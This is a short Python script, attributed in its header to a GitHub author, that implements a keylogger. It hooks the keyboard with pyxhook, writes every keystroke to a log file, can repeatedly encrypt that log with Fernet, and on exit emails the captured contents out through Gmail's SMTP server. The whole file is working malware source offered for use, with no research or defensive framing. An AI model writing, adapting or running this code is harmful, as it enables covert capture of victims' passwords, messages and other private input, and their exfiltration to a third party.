"""
Author: Arnold Vianna 
https://github.com/arnold-vianna
Keylogger with encryption and email capabilities
"""

import logging 
import argparse
import pyxhook
import time
import os
import smtplib
import getpass
from cryptography.fernet import Fernet

# Parse command line arguments using argparse
parser = argparse.ArgumentParser(description="Keylogger") 
parser.add_argument("-f", "--log-file", default="keylog.txt", help="Specify log file name and location")
parser.add_argument("-e", "--email", help="Email address to send logs to") 
parser.add_argument("-d", "--encrypt", action="store_true", help="Encrypt log file")
args = parser.parse_args()

# Setup logging to save keystrokes to log file
logging.basicConfig(filename=args.log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

# Encryption functions

# Generate encryption key if needed and load key 
def load_key():
    key_filename = 'encryption_key.key'
    if os.path.exists(key_filename):
        with open(key_filename, 'rb') as key_file:
            key = key_file.read()
    else:
        key = Fernet.generate_key()
        with open(key_filename, 'wb') as key_file:
            key_file.write(key)
            
    return key

# Encrypt log file 
def encrypt_log(key, log_filename):
    fernet = Fernet(key)
    
    with open(log_filename, 'rb') as f:
        data = f.read()

    encrypted_data = fernet.encrypt(data)

    with open(log_filename, 'wb') as f:
        f.write(encrypted_data)

# Email functions 

# Send log file contents via email
def email_log(email, password, log_filename):
    try:
        with open(log_filename) as f:
            log_contents = f.read()

        email_body = f"Log file: {log_filename}\n\n{log_contents}"

        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        smtp.login(email, password)
        smtp.sendmail(email, email, email_body)
        smtp.quit()

    except Exception as e:
        logging.error(f"Error sending email: {e}")

# Keylogger functions

# Handle key presses 
def on_key_press(event):
    logging.info(event.Key)

    if event.Key == 'space':
        add_newline_to_log()

    with open(args.log_file, 'a+') as f:
        f.flush()

# Add newline to log 
def add_newline_to_log():
    with open(args.log_file, 'a+') as f:
        f.write('\n')
        
# Start keylogger  
def start_keylogger():
    hookman = pyxhook.HookManager()
    hookman.KeyDown = on_key_press

    hookman.HookKeyboard()
    hookman.start()
    
    return hookman

# Stop keylogger
def stop_keylogger(hookman):
    if args.email:
        email_log(args.email, getpass.getpass(), args.log_file) 

    hookman.cancel()

# Main loop
if __name__ == '__main__':
    try:
        key = load_key()
        hookman = start_keylogger()

        while True:
            time.sleep(0.1)

            if args.encrypt:
                encrypt_log(key, args.log_file)

    except KeyboardInterrupt:
        stop_keylogger(hookman)
